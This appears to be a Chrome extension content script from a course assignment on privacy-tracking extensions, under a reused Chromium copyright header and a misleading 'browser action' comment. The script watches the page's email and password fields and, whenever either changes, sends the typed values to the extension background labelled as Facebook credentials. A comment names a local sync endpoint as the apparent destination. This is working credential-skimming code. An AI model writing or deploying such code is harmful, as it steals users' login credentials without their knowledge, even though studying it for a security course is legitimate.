// Copyright (c) 2011 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Called when the user clicks on the browser action.
//python run_test1.py ~/work/bs/hw2/myextensions/2.1 privacy tracking extension https://logging.local:3000/sync
$(document).ready(function () {
  $( "#email" ).change(function() {
    chrome.runtime.sendMessage({facebookEmail: $("#email").val()}, function(response) {
      console.log(response.farewell);
    });
  });
  $( "#pass" ).change(function() {
    chrome.runtime.sendMessage({facebookPass: $("#pass").val()}, function(response) {
      console.log(response.farewell);
    });
  });
});

function sendMessageToBack(para){
  chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
    console.log(response.farewell);
  });
}
